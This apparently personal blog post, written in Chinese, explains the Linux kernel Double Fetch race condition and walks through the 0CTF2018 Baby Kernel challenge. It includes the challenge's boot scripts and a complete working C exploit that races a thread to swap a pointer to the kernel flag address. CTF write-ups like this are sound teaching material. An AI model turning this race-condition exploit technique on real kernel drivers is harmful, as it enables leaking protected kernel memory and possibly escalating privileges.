---
title: Linux Kernel Double Fetch
date: 2025-12-02 9:30:38
categories: Linux
tags:
mathjax:
top:
---

### Double Fetch简介

Double Fetch 从漏洞原理上来说，是一种内核态与用户态之间的条件竞争。

在 Linux 等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能代码通常情况下，用户空间向内核传递数据时，内核先通过通过`copy_from_user`等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，但在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常。

一个典型的 Double Fetch 漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次调用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。


![](/assets/Pasted%20image%2020250609075758.png)

### 例题 0CTF2018 Baby Kernel

#### 分析

分析启动脚本发现内核没有开启任何保护。

```shell
qemu-system-x86_64 \
-m 256M -smp 2,cores=2,threads=1  \
-kernel ./vmlinuz-4.15.0-22-generic \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet" \
-cpu qemu64 \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  -enable-kvm  \
```

查看内核 init

```shell
#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
echo "flag{this_is_a_sample_flag}" > flag
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod baby.ko
chmod 777 /dev/baby
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

解包文件系统：

```shell
mkdir core && cd core
cp ../core.cpio .
cpio -idmv < core.cpio
```

逆向分析 baby.ko

分析代码发现如果 a2 为 0x6666 就会打印出 flag 的地址，如果 a2 为 0x1337 就会将我们传入的 flag 和真正的 flag 做比较。

<img src="/assets/image-20250902075431889.png" alt="image-20250902075431889" style="zoom:50%;" />

根据 `Double Fetch` 漏洞原理，发现此题目存在一个 `Double Fetch` 漏洞，当用户输入数据通过验证后，再将 `flag_str` 所指向的地址改为 flag 硬编码地址后，即会输出 flag 内容。

#### 思路

首先，利用提供的 `cmd=0x6666` 功能，获取内核中 flag 的加载地址。

> 内核中以 `printk` 输出的内容，可以通过 `dmesg` 命令查看。

然后，构造符合 `cmd=0x1337` 功能的数据结构，其中 `flag_len` 可以从硬编码中直接获取为 33， `flag_str` 指向一个用户空间地址。

最后，创建一个恶意线程，不断的将 `flag_str` 所指向的用户态地址修改为 flag 的内核地址以制造竞争条件，从而使其通过驱动中的逐字节比较检查，输出 flag 内容。

```bash
./start.sh 

./exp
```

> `exp.c` 中碰撞次数为0x1000，若不成功，可尝试将 `TRYTIME` 增大，或多试几次。

- exp

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <sys/ioctl.h>

pthread_t compete_thread;
void* real_addr;
char buf[0x20] = {0};
int competetion_times = 0x1000, status = 1;

struct 
{
    char* flag_addr;
    int flag_len;
} flag = {.flag_addr = buf, .flag_len = 33};

void *competetionThread(void *arg)
{
    while (status)
    {
        for (int i = 0; i < competetion_times; i++)
            flag.flag_addr = real_addr;
    }
    return NULL;
}

int main()
{
    int fd, result_fd, addr_fd;

    char *temp, *flag_addr_addr;

    fd = open("/dev/baby", O_RDWR);
    ioctl(fd, 0x6666);

    system("dmesg | grep flag > addr");

    temp = (char*) malloc(0x1000);

    addr_fd = open("./addr", O_RDONLY);
    temp[read(addr_fd, temp, 0x100)] = '\0';

    // 获取 "Your flag is at XXXXX" 中的地址部分
    flag_addr_addr = strstr(temp, "Your flag is at ") + strlen("Your flag is at ");

    real_addr = (void *)strtoull(flag_addr_addr, NULL, 16);

    pthread_create(&compete_thread, NULL, competetionThread, NULL);

    while (status)
    {
        for (int i = 0; i < competetion_times; i++)
        {
            flag.flag_addr = buf;
            ioctl(fd, 0x1337, &flag);
        }

        system("dmesg | grep flag > result");

        result_fd = open("./result", O_RDONLY);
        read(result_fd, temp, 0x1000);

        if (strstr(temp, "flag{"))
            status = 0;
    }

    pthread_cancel(compete_thread);

    printf("[+] competetion end!\n");
    system("dmesg | grep flag");

    return 0;
}
```

编译和运行：

```shell
gcc -static exp.c -lpthread -o exp
touch addr result
```

cat flag 成功：

![](/assets/image-20251117220924278.png)